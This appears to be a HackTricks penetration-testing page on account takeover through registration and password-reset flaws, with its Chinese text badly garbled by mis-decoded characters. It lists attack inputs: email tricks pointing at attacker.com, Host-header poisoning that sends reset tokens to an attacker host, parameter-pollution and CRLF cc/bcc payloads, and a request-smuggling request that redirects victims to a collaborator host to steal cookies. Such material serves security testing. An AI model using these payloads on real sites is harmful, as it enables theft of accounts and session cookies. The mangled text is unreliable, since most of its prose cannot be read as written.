# æ³¨å†Œ & æ¥ç®¡æ¼æ´

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS çº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨ HackTricks ä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½ PDF ç‰ˆæœ¬çš„ HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live) ä¸Š**å…³æ³¨**æˆ‘ä»¬ã€‚
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) æ˜¯ä¸€ä¸ªç”±**æš—ç½‘**æ”¯æŒçš„æœç´¢å¼•æ“ï¼Œæä¾›å…è´¹åŠŸèƒ½ï¼Œç”¨äºæ£€æŸ¥å…¬å¸æˆ–å…¶å®¢æˆ·æ˜¯å¦å—åˆ°**çªƒå–æ¶æ„è½¯ä»¶**çš„**ä¾µå®³**ã€‚

WhiteIntel çš„ä¸»è¦ç›®æ ‡æ˜¯æ‰“å‡»ç”±ä¿¡æ¯çªƒå–æ¶æ„è½¯ä»¶å¯¼è‡´çš„è´¦æˆ·æ¥ç®¡å’Œå‹’ç´¢è½¯ä»¶æ”»å‡»ã€‚

æ‚¨å¯ä»¥è®¿é—®ä»–ä»¬çš„ç½‘ç«™å¹¶å…è´¹å°è¯•ä»–ä»¬çš„å¼•æ“ï¼š

{% embed url="https://whiteintel.io" %}

***

## æ³¨å†Œæ¥ç®¡

### é‡å¤æ³¨å†Œ

* å°è¯•ä½¿ç”¨ç°æœ‰ç”¨æˆ·åç”Ÿæˆ
* æ£€æŸ¥å˜åŒ–çš„ç”µå­é‚®ä»¶ï¼š
  * å¤§å†™
  * \+1@
  * åœ¨ç”µå­é‚®ä»¶ä¸­æ·»åŠ ä¸€äº›ç‚¹
  * ç”µå­é‚®ä»¶åç§°ä¸­çš„ç‰¹æ®Šå­—ç¬¦ï¼ˆ%00ï¼Œ%09ï¼Œ%20ï¼‰
  * åœ¨ç”µå­é‚®ä»¶åé¢æ”¾ç½®é»‘è‰²å­—ç¬¦ï¼š`test@test.com a`
  * victim@gmail.com@attacker.com
  * victim@attacker.com@gmail.com

### ç”¨æˆ·åæšä¸¾

æ£€æŸ¥æ˜¯å¦å¯ä»¥ç¡®å®šåº”ç”¨ç¨‹åºä¸­æ˜¯å¦å·²ç»æ³¨å†Œäº†ç”¨æˆ·åã€‚

### å¯†ç ç­–ç•¥

åˆ›å»ºç”¨æˆ·æ—¶æ£€æŸ¥å¯†ç ç­–ç•¥ï¼ˆæ£€æŸ¥æ˜¯å¦å¯ä»¥ä½¿ç”¨å¼±å¯†ç ï¼‰ã€‚\
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥å°è¯•æš´åŠ›ç ´è§£å‡­æ®ã€‚

### SQL æ³¨å…¥

[**æŸ¥çœ‹æ­¤é¡µé¢**](sql-injection/#insert-statement)äº†è§£å¦‚ä½•å°è¯•é€šè¿‡æ³¨å†Œè¡¨å•ä¸­çš„**SQL æ³¨å…¥**è¿›è¡Œè´¦æˆ·æ¥ç®¡æˆ–æå–ä¿¡æ¯ã€‚

### Oauth æ¥ç®¡

{% content-ref url="oauth-to-account-takeover.md" %}
[oauth-to-account-takeover.md](oauth-to-account-takeover.md)
{% endcontent-ref %}

### SAML æ¼æ´

{% content-ref url="saml-attacks/" %}
[saml-attacks](saml-attacks/)
{% endcontent-ref %}

### æ›´å¤šæ£€æŸ¥

* æ£€æŸ¥æ˜¯å¦å¯ä»¥ä½¿ç”¨**ä¸€æ¬¡æ€§ç”µå­é‚®ä»¶**
* **é•¿** **å¯†ç **ï¼ˆ>200ï¼‰ä¼šå¯¼è‡´**æ‹’ç»æœåŠ¡**
* **æ£€æŸ¥è´¦æˆ·åˆ›å»ºçš„é€Ÿç‡é™åˆ¶**
* ä½¿ç”¨ username@**burp\_collab**.net å¹¶åˆ†æ**å›è°ƒ**

## **å¯†ç é‡ç½®æ¥ç®¡**

### é€šè¿‡å¼•ç”¨è€…æ³„æ¼å¯†ç é‡ç½®ä»¤ç‰Œ <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. è¯·æ±‚å°†å¯†ç é‡ç½®åˆ°æ‚¨çš„ç”µå­é‚®ä»¶åœ°å€
2. å•å‡»å¯†ç é‡ç½®é“¾æ¥
3. ä¸è¦æ›´æ”¹å¯†ç 
4. å•å‡»ä»»ä½•ç¬¬ä¸‰æ–¹ç½‘ç«™ï¼ˆä¾‹å¦‚ï¼šFacebookï¼ŒTwitterï¼‰
5. æ‹¦æˆª Burp Suite ä»£ç†ä¸­çš„è¯·æ±‚
6. æ£€æŸ¥ referer æ ‡å¤´æ˜¯å¦æ³„æ¼å¯†ç é‡ç½®ä»¤ç‰Œã€‚

### å¯†ç é‡ç½®æ“çºµ <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. åœ¨ Burp Suite ä¸­æ‹¦æˆªå¯†ç é‡ç½®è¯·æ±‚
2. åœ¨ Burp Suite ä¸­æ·»åŠ æˆ–ç¼–è¾‘ä»¥ä¸‹æ ‡å¤´ï¼š`Host: attacker.com`ï¼Œ`X-Forwarded-Host: attacker.com`
3. ä½¿ç”¨ä¿®æ”¹åçš„æ ‡å¤´è½¬å‘è¯·æ±‚\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. æŸ¥æ‰¾åŸºäº _host æ ‡å¤´_çš„å¯†ç é‡ç½® URLï¼Œä¾‹å¦‚ï¼š`https://attacker.com/reset-password.php?token=TOKEN`

### é€šè¿‡ç”µå­é‚®ä»¶å‚æ•°è¿›è¡Œå¯†ç é‡ç½® <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```powershell
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### APIå‚æ•°ä¸Šçš„IDOR <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. æ”»å‡»è€…å¿…é¡»ä½¿ç”¨ä»–ä»¬çš„å¸æˆ·ç™»å½•å¹¶è½¬åˆ°**æ›´æ”¹å¯†ç **åŠŸèƒ½ã€‚
2. å¯åŠ¨Burp Suiteå¹¶æ‹¦æˆªè¯·æ±‚ã€‚
3. å°†å…¶å‘é€åˆ°é‡å¤å™¨é€‰é¡¹å¡å¹¶ç¼–è¾‘å‚æ•°ï¼šç”¨æˆ·ID/ç”µå­é‚®ä»¶\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### å¼±å¯†ç é‡ç½®ä»¤ç‰Œ <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

å¯†ç é‡ç½®ä»¤ç‰Œåº”è¯¥æ˜¯éšæœºç”Ÿæˆçš„ï¼Œå¹¶ä¸”æ¯æ¬¡éƒ½æ˜¯å”¯ä¸€çš„ã€‚\
å°è¯•ç¡®å®šä»¤ç‰Œæ˜¯å¦è¿‡æœŸæˆ–æ˜¯å¦å§‹ç»ˆç›¸åŒï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œç”Ÿæˆç®—æ³•è¾ƒå¼±ï¼Œå¯ä»¥è¢«çŒœæµ‹ã€‚ä»¥ä¸‹å˜é‡å¯èƒ½è¢«ç®—æ³•ä½¿ç”¨ã€‚

* æ—¶é—´æˆ³
* ç”¨æˆ·ID
* ç”¨æˆ·ç”µå­é‚®ä»¶
* åå­—å’Œå§“æ°
* å‡ºç”Ÿæ—¥æœŸ
* å¯†ç å­¦
* ä»…æ•°å­—
* å°ä»¤ç‰Œåºåˆ—ï¼ˆå­—ç¬¦åœ¨\[A-Z,a-z,0-9]ä¹‹é—´ï¼‰
* ä»¤ç‰Œé‡ç”¨
* ä»¤ç‰Œè¿‡æœŸæ—¥æœŸ

### æ³„éœ²å¯†ç é‡ç½®ä»¤ç‰Œ <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. ä½¿ç”¨API/UIè§¦å‘ç‰¹å®šç”µå­é‚®ä»¶çš„å¯†ç é‡ç½®è¯·æ±‚ï¼Œä¾‹å¦‚ï¼štest@mail.com
2. æ£€æŸ¥æœåŠ¡å™¨å“åº”å¹¶æŸ¥æ‰¾`resetToken`
3. ç„¶ååœ¨URLä¸­ä½¿ç”¨ä»¤ç‰Œï¼Œå¦‚`https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### é€šè¿‡ç”¨æˆ·åå†²çªè¿›è¡Œå¯†ç é‡ç½® <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. ä½¿ç”¨ä¸å—å®³è€…ç”¨æˆ·åç›¸åŒçš„ç”¨æˆ·ååœ¨ç³»ç»Ÿä¸Šæ³¨å†Œï¼Œä½†åœ¨ç”¨æˆ·åä¹‹å‰å’Œ/æˆ–ä¹‹åæ’å…¥ç©ºæ ¼ã€‚ä¾‹å¦‚ï¼š`"admin "`
2. ä½¿ç”¨æ‚¨çš„æ¶æ„ç”¨æˆ·åè¯·æ±‚é‡ç½®å¯†ç ã€‚
3. ä½¿ç”¨å‘é€åˆ°æ‚¨çš„ç”µå­é‚®ä»¶çš„ä»¤ç‰Œé‡ç½®å—å®³è€…å¯†ç ã€‚
4. ä½¿ç”¨æ–°å¯†ç è¿æ¥åˆ°å—å®³è€…å¸æˆ·ã€‚

å¹³å°CTFdå®¹æ˜“å—åˆ°æ­¤æ”»å‡»çš„å½±å“ã€‚\
å‚è§ï¼š[CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### é€šè¿‡è·¨ç«™è„šæœ¬æ”»å‡»å®æ–½è´¦æˆ·æ¥ç®¡ <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. åœ¨åº”ç”¨ç¨‹åºå†…éƒ¨æˆ–å­åŸŸä¸­æ‰¾åˆ°XSSæ¼æ´ï¼Œå¦‚æœcookieçš„èŒƒå›´é™å®šåœ¨çˆ¶åŸŸï¼š`*.domain.com`
2. æ³„éœ²å½“å‰çš„**ä¼šè¯cookie**
3. ä½¿ç”¨cookieå¯¹ç”¨æˆ·è¿›è¡Œèº«ä»½éªŒè¯

### é€šè¿‡HTTPè¯·æ±‚èµ°ç§å®æ–½è´¦æˆ·æ¥ç®¡ <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. ä½¿ç”¨**smuggler**æ£€æµ‹HTTPè¯·æ±‚èµ°ç§çš„ç±»å‹ï¼ˆCLã€TEã€CL.TEï¼‰\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. æ„é€ ä¸€ä¸ªè¯·æ±‚ï¼Œè¯¥è¯·æ±‚å°†ä½¿ç”¨ä»¥ä¸‹æ•°æ®è¦†ç›–`POST / HTTP/1.1`ï¼š\
`GET http://something.burpcollaborator.net HTTP/1.1 X:`ï¼Œç›®çš„æ˜¯å°†å—å®³è€…é‡å®šå‘åˆ°burpcollabå¹¶çªƒå–å…¶cookie\
3. æœ€ç»ˆè¯·æ±‚å¯èƒ½å¦‚ä¸‹æ‰€ç¤º
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone æŠ¥å‘Šåˆ©ç”¨æ­¤æ¼æ´\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### é€šè¿‡ CSRF è¿›è¡Œè´¦æˆ·æ¥ç®¡ <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. åˆ›å»º CSRF çš„ payloadï¼Œä¾‹å¦‚ï¼šâ€œè‡ªåŠ¨æäº¤å¯†ç æ›´æ”¹çš„ HTML è¡¨å•â€
2. å‘é€ payload

### é€šè¿‡ JWT è¿›è¡Œè´¦æˆ·æ¥ç®¡ <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token å¯èƒ½ç”¨äºéªŒè¯ç”¨æˆ·èº«ä»½ã€‚

* ç¼–è¾‘ JWTï¼Œä½¿ç”¨å¦ä¸€ä¸ªç”¨æˆ· ID / ç”µå­é‚®ä»¶
* æ£€æŸ¥å¼± JWT ç­¾å

{% content-ref url="hacking-jwt-json-web-tokens.md" %}
[hacking-jwt-json-web-tokens.md](hacking-jwt-json-web-tokens.md)
{% endcontent-ref %}

## å‚è€ƒèµ„æ–™

* [https://salmonsec.com/cheatsheet/account\_takeover](https://salmonsec.com/cheatsheet/account\_takeover)

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) æ˜¯ä¸€ä¸ªç”±**æš—ç½‘**æ”¯æŒçš„æœç´¢å¼•æ“ï¼Œæä¾›**å…è´¹**åŠŸèƒ½ï¼Œç”¨äºæ£€æŸ¥å…¬å¸æˆ–å…¶å®¢æˆ·æ˜¯å¦å—åˆ°**çªƒå–æ¶æ„è½¯ä»¶**çš„**å¨èƒ**ã€‚

WhiteIntel çš„ä¸»è¦ç›®æ ‡æ˜¯æ‰“å‡»ç”±çªƒå–ä¿¡æ¯æ¶æ„è½¯ä»¶å¯¼è‡´çš„è´¦æˆ·æ¥ç®¡å’Œå‹’ç´¢è½¯ä»¶æ”»å‡»ã€‚

æ‚¨å¯ä»¥è®¿é—®ä»–ä»¬çš„ç½‘ç«™å¹¶å…è´¹å°è¯•ä»–ä»¬çš„å¼•æ“ï¼š

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½ PDF ç‰ˆæœ¬çš„ HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚**
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
